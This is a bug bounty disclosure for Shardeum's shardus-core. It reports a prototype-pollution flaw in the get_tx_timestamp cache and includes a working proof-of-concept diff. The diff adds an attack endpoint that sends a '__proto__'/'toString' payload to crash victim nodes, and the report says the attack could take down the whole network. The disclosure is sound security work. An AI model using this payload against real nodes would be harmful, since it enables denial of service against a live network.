# 34353 - \[BC - Critical] Killing nodes by polluting tx timestamp cache o...

Submitted on Aug 10th 2024 at 01:29:47 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34353

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Description

In the @shardus/core source code repo, node store a cache of transaction timestamp. Other node will ask the cache, if it's a miss the node will create new transaction timestamp cache object derived from payload of the request. This mean that malicious party can launch a modified node, send the polluted payload to victim node via `get_tx_timestamp` cache ask endpoint. Subsequently killing the victim node.

## Vulnerability

This happen due to the cache holder node will create a transaction timestamp object if the timestamp for given transaction not found in its own cache. The problem lies within the way the cache is created.

```
this.txTimestampCache[signedTsReceipt.cycleCounter][txId] = signedTsReceipt
```

This way of referencing the cache object to assign a value is dangerous, because the referenced element come straight from the request payload. With that in mind consider the following payload

```
{
  cycleMarker: "__proto__",
  cycleCounter: "__proto__",
  txId: "toString"
}
```

This mean that the cache object will be created in the following way

```
this.txTimestampCache["__proto__"]["toString"] = signedTsReceipt
```

Essentially overwriting the prototype of the cache object, and the `toString` method of the cache object. This is problematic because `toString` is polluted to be a literal string which in turns break the code of the victim when stringify operations are done later down the stream.

## Proof of Concept

* Launch a network of legit nodes.
* Launch an attacker node with this patch applied to shardus/core
* Wait for the attacker node to go active

```diff

diff --git a/src/utils/nestedCounters.ts b/src/utils/nestedCounters.ts
index 3ebbb782..5fbe9796 100644
--- a/src/utils/nestedCounters.ts
+++ b/src/utils/nestedCounters.ts
@@ -5,6 +5,11 @@ import Crypto from '../crypto'
 import { isDebugModeMiddleware, isDebugModeMiddlewareLow } from '../network/debugMiddleware'
 import { getNetworkTimeOffset, shardusGetTime } from '../network'
 import { Utils } from '@shardus/types'
+import { InternalRouteEnum } from '../types/enum/InternalRouteEnum'
+import { getTxTimestampReq, serializeGetTxTimestampReq } from '../types/GetTxTimestampReq'
+import { deserializeGetTxTimestampResp, getTxTimestampResp } from '../types/GetTxTimestampResp'
+import * as crypto from "crypto"
+

 type CounterMap = Map<string, CounterNode>
 interface CounterNode {
@@ -32,6 +37,30 @@ class NestedCounters {
   }

   registerEndpoints(): void {
+
+    Context.network.registerExternalGet('launch-attk', async (req, res)=>{
+
+          const victim = req.query.victim as string
+
+          const node = Context.shardus.getNodeByPubKey(victim)
+
+          const cycleMarker = crypto.randomBytes(254).toString()
+
+          const cycleCounter = "__proto__"
+
+          const txId = "toString"
+
+          const payload = {
+            cycleMarker,
+            cycleCounter,
+            txId
+          }
+
+          const data = await Context.p2p.ask(node, "get_tx_timestamp", payload, false)
+
+          res.send(data)
+    })
+
     Context.network.registerExternalGet('counts', isDebugModeMiddlewareLow, (req, res) => {
       profilerInstance.scopedProfileSectionStart('counts')


```

* Send a request to the attacker node with the victim node public key as a query parameter
* `GET http://localhost:1337/launch-attk?victim=<publickey>`
* observe the logs, the node exit unCleanly, essentially killing the node.

## Impact

This is pretty straight forward single node attack, the script can be modified to attack the whole network to kill the whole network.
